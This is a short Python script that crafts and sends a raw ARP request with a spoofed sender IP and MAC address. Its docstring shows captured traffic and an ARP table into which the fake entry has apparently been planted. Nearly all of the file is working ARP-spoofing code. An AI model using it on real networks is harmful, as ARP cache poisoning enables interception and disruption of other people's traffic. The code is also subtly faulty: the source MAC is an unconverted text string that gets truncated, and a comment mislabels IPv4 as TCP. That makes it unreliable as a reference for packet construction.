import socket, struct

"""
fakemac generated with:
openssl rand -hex 6| sed -e 's/\(..\)/\1:/g' -e 's/.$//'

This is a capture of the output:
root@beatbox:~#  tcpdump -nnti eth0 arp or icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
ARP, Request who-has 192.168.1.100 (bb:bb:bb:bb:bb:bb) tell 192.168.1.222, length 28
ARP, Reply 192.168.1.100 is-at 44:65:90:d1:94:0a, length 46
^C
2 packets captured
4 packets received by filter
0 packets dropped by kernel


See that the fake IP and MAC are now in the table
user:~/$ arp -a
router  (192.168.1.1) at 60:38:e0:8e:2:7e on en0 ifscope [ethernet]
? (192.168.1.222) at 64:61:3a:31:36:3a on en0 ifscope [ethernet]

"""
# This is for UNIX/Linux
rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
# if on osx/Windows you probably want: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
rawSocket.bind(("eth0", socket.htons(0x0800)))

# Mac addresses error out if not bytes type
source_mac = b"08:00:27:5e:26:c3"        # sender mac address
source_ip  = "192.168.1.222"           # sender ip address
dest_mac = b"\xbb\xbb\xbb\xbb\xbb\xbb"   # target mac address
dest_ip  = "192.168.1.100"             # target ip address

# Ethernet Header
protocol = 0x0806                       # 0x0806 for ARP
eth_hdr = struct.pack("!6s6sH", dest_mac, source_mac, protocol)

# ARP header
htype = 1                               # Hardware_type ethernet
ptype = 0x0800                          # Protocol type TCP
hlen = 6                                # Hardware address Len
plen = 4                                # Protocol addr. len
operation = 1                           # 1=request/2=reply
src_ip = socket.inet_aton(source_ip)
dst_ip = socket.inet_aton(dest_ip)
arp_hdr = struct.pack("!HHBBH6s4s6s4s", htype, ptype, hlen, plen, operation, source_mac, src_ip, dest_mac, dst_ip)

packet = eth_hdr + arp_hdr
rawSocket.send(packet)

